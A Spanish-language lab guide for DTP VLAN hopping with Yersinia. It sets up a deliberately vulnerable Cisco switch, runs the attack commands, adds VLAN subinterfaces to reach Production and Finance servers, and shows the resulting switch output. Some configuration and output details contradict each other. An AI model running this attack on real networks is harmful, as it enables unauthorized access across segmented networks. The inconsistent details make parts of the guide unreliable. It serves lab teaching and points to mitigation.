# GUÍA DE USO: DTP VLAN Hopping con Yersinia

## 📋 Índice
1. [Preparación del Entorno](#preparación-del-entorno)
2. [Instalación de Herramientas](#instalación-de-herramientas)
3. [Configuración del Escenario](#configuración-del-escenario)
4. [Ejecución del Ataque](#ejecución-del-ataque)
5. [Análisis de Resultados](#análisis-de-resultados)
6. [Galería de Imágenes](#galería-de-imágenes)

---

## Preparación del Entorno

### Topología de Red Recomendada

```
┌─────────────────────────────────────────┐
│         Switch Cisco (Víctima)          │
│         Catalyst 2960 o similar         │
├─────────────────────────────────────────┤
│  Gi0/0/1  (ACCESS, VLAN 10)             │
│           ← Conectar atacante AQUÍ      │
├─────────────────────────────────────────┤
│  Gi0/0/2  (ACCESS, VLAN 20)             │
│           ← Servidor de Producción      │
├─────────────────────────────────────────┤
│  Gi0/0/47-48 (TRUNK a otro switch)      │
└─────────────────────────────────────────┘
     ▲
     │
     └─ Máquina Atacante (eth0)
```

### Requisitos

- **Switch**: Cisco Catalyst 2960 o equivalente (GNS3, Packet Tracer)
- **Máquina Atacante**: Linux con capacidad de raw sockets
- **Conexión**: Puerto Ethernet físico o puente virtual

---

## Instalación de Herramientas

### Yersinia

```bash
# Instalación rápida
sudo apt-get update
sudo apt-get install -y yersinia libpcap-dev tcpdump wireshark

# Verificar
yersinia --version
# Output: Yersinia 0.8.x - Layer 2 Attack Tool

# Detectar interfaces
ip link show
# Buscar: eth0, enp0s3, etc.
```

### Dependencias Adicionales

```bash
sudo apt-get install -y \
    net-tools \
    ethtool \
    iputils-ping \
    dnsutils
```

---

## Configuración del Escenario

### Paso 1: Configurar Switch Vulnerable

```cisco
! ========== CONFIGURACIÓN VULNERABLE ==========

Switch# configure terminal

! 1. Crear VLANs
Switch(config)# vlan 10
Switch(config-vlan)# name Users
Switch(config-vlan)# exit

Switch(config)# vlan 20
Switch(config-vlan)# name Production
Switch(config-vlan)# exit

Switch(config)# vlan 30
Switch(config-vlan)# name Finance
Switch(config-vlan)# exit

! 2. Configurar puerto de usuario (VULNERABLE)
Switch(config)# interface GigabitEthernet0/0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 10
! ⚠️ NO agregamos "switchport nonegotiate"
! Esto deja DTP habilitado (VULNERABLE)
Switch(config-if)# no shutdown
Switch(config-if)# exit

! 3. Configurar puerto 2 (Servidor en VLAN 20)
Switch(config)# interface GigabitEthernet0/0/2
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 20
Switch(config-if)# no shutdown
Switch(config-if)# exit

! 4. Configurar puerto 3 (Servidor Finance en VLAN 30)
Switch(config)# interface GigabitEthernet0/0/3
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan 30
Switch(config-if)# no shutdown
Switch(config-if)# exit

! 5. Verificar configuración antes del ataque
Switch# show vlan brief
VLAN Name                             Status    Ports
---- -------------------------------- --------- ------------------
1    default                          active    Gi0/0/4-48
10   Users                            active    Gi0/0/1
20   Production                       active    Gi0/0/2
30   Finance                          active    Gi0/0/3

Switch# show interface Gi0/0/1 switchport
Name: Gi0/0/1
Switchport: Enabled
Administrative Mode: dynamic auto ← DTP ACTIVO
Operational Mode: static access
Administrative Trunking Encapsulation: negotiate
Operational Trunking Encapsulation: native
Negotiation of Trunking: On ← ¡VULNERABLE!
```

### Paso 2: Configurar Máquina Atacante

En Linux atacante:
```bash
# 1. Configurar interfaz de red
sudo ip link set eth0 up
sudo ip addr add 192.168.10.100/24 dev eth0

# 2. Verificar conectividad inicial (mismo VLAN)
ping 192.168.10.1  # IP del switch en VLAN 10

# 3. Intentar acceder a VLAN 20 (debe fallar)
ping 192.168.20.1  # DEBE FALLAR - No tiene ruta a VLAN 20
```

---

## Ejecución del Ataque

### Método 1: Modo Interactivo (Recomendado para Aprendizaje)

```bash
# Iniciar Yersinia en modo interactivo
sudo yersinia -I

# Pasos en la interfaz:
# 1. Seleccionar protocolo: DTP
# 2. Seleccionar interfaz: eth0
# 3. Seleccionar ataque tipo: DTP Trunk negotiation (desirable)
# 4. Pressionar 'a' para ejecutar el ataque
```

### Método 2: Modo CLI (Scripting)

```bash
# Ataque DTP básico: Desirable negotiation
sudo yersinia dtp -attack 1 -interface eth0

# Ataque con verbose (debug)
sudo yersinia dtp -attack 1 -interface eth0 -v

# Ataque múltiple: Repetir 5 veces para garantizar
for i in {1..5}; do
    sudo yersinia dtp -attack 1 -interface eth0
    sleep 1
done
```

### Método 3: Ataque Personalizado Avanzado

```bash
# DTP con parámetros específicos
sudo yersinia dtp \
    -attack 1 \
    -interface eth0 \
    -config vlan:20,native:20 \
    -v
```

### Monitorización en Tiempo Real

En una terminal separada, capturar tráfico DTP:

```bash
# Terminal 2: Capturar DTP
sudo tcpdump -i eth0 -n 'ether dst 01:00:0c:cc:cc:cc' -A

# Terminal 3: Monitorear cambios de puerto
ssh admin@<switch_ip>
Switch# terminal monitor
Switch# show interface Gi0/0/1 switchport | include Mode
```

---

## Análisis de Resultados

### Verificación en el Switch DESPUÉS del Ataque

```cisco
! Conectar a consola o SSH del switch

! 1. Ver modo operacional del puerto
Switch# show interface GigabitEthernet0/0/1 switchport
Name: Gi0/0/1
Switchport: Enabled
Administrative Mode: dynamic auto
Operational Mode: static trunk ← ¡CAMBIÓ DE ACCESS A TRUNK!
Administrative Trunking Encapsulation: negotiate
Operational Trunking Encapsulation: dot1q ← 802.1Q habilitado
Negotiation of Trunking: On
Allowed VLANs: 1-4094 ← Ahora ve TODAS las VLANs
Native VLAN: 1

! 2. Verificar tráfico permitido
Switch# show interface GigabitEthernet0/0/1 trunk
Port        Mode      Encapsulation  Status  Native vlan
Gi0/0/1     on        802.1q         trunking  1
! ↑ Ahora es un puerto troncal funcional
```

### Verificación en el Atacante

```bash
# Ahora el atacante puede acceder a otras VLANs

# 1. Configurar múltiples VLANs en la interfaz
sudo vconfig add eth0 10  # Subinterfaz para VLAN 10
sudo vconfig add eth0 20  # Subinterfaz para VLAN 20
sudo vconfig add eth0 30  # Subinterfaz para VLAN 30

# Asignar IPs a cada VLAN
sudo ip addr add 192.168.10.100/24 dev eth0.10
sudo ip addr add 192.168.20.100/24 dev eth0.20
sudo ip addr add 192.168.30.100/24 dev eth0.30

# 2. Intentar nuevamente el acceso cruzado
ping -c 1 192.168.20.1  # Ahora SÍ responderá ✓
ping -c 1 192.168.30.1  # Ahora SÍ responderá ✓

# 3. Acceso a servicios de otras VLANs
ssh user@192.168.20.10  # Servidor Production ✓ ACCESO
ssh user@192.168.30.10  # Servidor Finance ✓ ACCESO
```

### Captura Wireshark

```bash
# Capturar DTP negotiations
sudo wireshark -i eth0 &

# Filtros útiles en Wireshark:
# Display Filter: dtp
# Display Filter: vlan
# Display Filter: eth.dst == 01:00:0c:cc:cc:cc
```

### Indicadores de Éxito

✅ **Señales de Ataque Exitoso**:
1. Puerto cambió de "access" a "trunk"
2. Encapsulación es 802.1Q
3. Ahora ve todas las VLANs (1-4094)
4. Atacante obtiene conectividad a otras VLANs
5. Tráfico fluye entre VLANs sin filtrado

❌ **Señales de Fallo**:
1. "switchport nonegotiate" está configurado
2. Puerto sigue en modo "static access"
3. Encapsulación no cambia a "dot1q"
4. Máquina atacante no obtiene acceso multi-VLAN
5. Switch descarta tramas taggadas 802.1Q

---

## Análisis Forense

### Log del Switch

```cisco
Switch# show history
! Debería mostrar cambios automáticos en el puerto (sin comandos manuales)
```

### Análisis de Tráfico Capturado

```bash
# Analizar PCAP
tcpdump -r dtp_attack.pcap -A | grep -i "dtp\|trunk"

# Extractar paquetes DTP
tshark -r dtp_attack.pcap -Y dtp -T text
```

---

## Galería de Imágenes

### 1. Ejecución de Yersinia (image_cd50b7.png)
Captura mostrando:
- Terminal ejecutando `sudo yersinia dtp -attack 1 -interface eth0`
- Output: "[+] DTP attack started"
- Interfaz objetivo: eth0
- Estado: Enviando frames de negotiation

**Instrucciones**:
```bash
# Capturar durante ejecución del ataque
scrot ~/Desktop/image_cd50b7.png
```

### 2. Negociación DTP en Wireshark (image_dtp_negotiation.png)
Captura mostrando:
- Filtro Wireshark: `dtp`
- Paquetes DTP inyectados por Yersinia
- Campos visibles:
  - MAC Src: AA:BB:CC:DD:EE:FF (atacante)
  - MAC Dst: 01:00:0c:cc:cc:cc (multicast DTP)
  - DTP Type: Capabilities Exchange
  - Capabilities: Can negotiate trunking

**Instrucciones**:
```bash
sudo wireshark -i eth0 &
# Filtrar: dtp
# Capturar el proceso de negociación
# Screenshot durante envío de Yersinia
```

### 3. Puerto Convertido a Trunk (image_trunk_port_created.png)
Captura mostrando:
```cisco
Switch# show interface Gi0/0/1 switchport
Name: Gi0/0/1
Operational Mode: static trunk ← ✓ CAMBIÓ
Negotiation of Trunking: On
Allowed VLANs: 1-4094 ← Ahora VE TODAS
```

**Instrucciones**:
```bash
# En terminal del switch
ssh admin@<switch_ip>
# Capturar output después de ataque
# Comparar ANTES (static access) vs DESPUÉS (static trunk)
```

### 4. Acceso Multi-VLAN Post-Ataque (image_vlan_access.png)
Captura mostrando:
- Terminal atacante
- Pings exitosos a múltiples VLANs
- Ejemplo:
  ```bash
  $ ping -c 1 192.168.20.1
  64 bytes from 192.168.20.1: icmp_seq=1 ttl=255 time=1.23ms ✓
  
  $ ping -c 1 192.168.30.1
  64 bytes from 192.168.30.1: icmp_seq=1 ttl=255 time=0.98ms ✓
  ```

**Instrucciones**:
```bash
# Después del ataque, configurar VLAN subinterfaces
sudo vconfig add eth0 20
sudo vconfig add eth0 30
sudo ip addr add 192.168.20.100/24 dev eth0.20
sudo ip addr add 192.168.30.100/24 dev eth0.30

# Ping desde atacante a múltiples VLANs
ping -c 3 192.168.20.1 2>&1 | head -5
ping -c 3 192.168.30.1 2>&1 | head -5
```

### 5. Comparativa Before/After (image_before_after.png)
Diagrama visual mostrando:
```
ANTES:
Atacante (VLAN 10) → Puerto Gi0/0/1 (access)
  ├─ Puede ver VLAN 10 ✓
  └─ Aislado de VLAN 20, 30 ✗

DESPUÉS:
Atacante (VLAN 10) → Puerto Gi0/0/1 (trunk)
  ├─ Puede ver VLAN 1-4094 ✓
  ├─ Acceso a VLAN 20 (Production) ✗ HOPPED
  └─ Acceso a VLAN 30 (Finance) ✗ HOPPED
```

---

## 📸 Instrucciones de Subida de Imágenes

1. Tomar screenshots durante la ejecución
2. Guardar con nombres descriptivos
3. Asegurarse de ofuscar datos sensibles
4. Guardar en `imagenes/` directorio
5. Máximo 2MB por archivo PNG

```bash
# Ej: Guardar captura con nombre específico
scrot imagenes/image_cd50b7.png

# O de Wireshark:
# File → Export as Image... → image_dtp_negotiation.png
```

---

## Resolución de Problemas

| Problema | Causa | Solución |
|----------|-------|----------|
| "Permission denied" | Falta sudo | Usar: `sudo yersinia dtp ...` |
| "Interface not found" | eth0 incorrecto | Verificar: `ip link show` |
| "No DTP packets captured" | Interfaz no en VLAN correcta | Verificar: Atacante en mismo vlan que puerto |
| Puerto no se hace trunk | "switchport nonegotiate" activo | Usar switch vulnerable de lab |
| No tiene acceso multi-VLAN | VLAN subinterfaces no creadas | Crear: `sudo vconfig add eth0 20` |

---

## Próximos Pasos

1. ✅ Ejecutar ataque múltiples veces
2. ✅ Documentar cambios con capturas
3. ✅ Analizar tráfico DTP en profundidad
4. ✅ Implementar defensa (ver `MITIGACION.md`)
5. ✅ Verificar que `switchport nonegotiate` bloquea el ataque

---

**Última actualización**: Febrero 2026
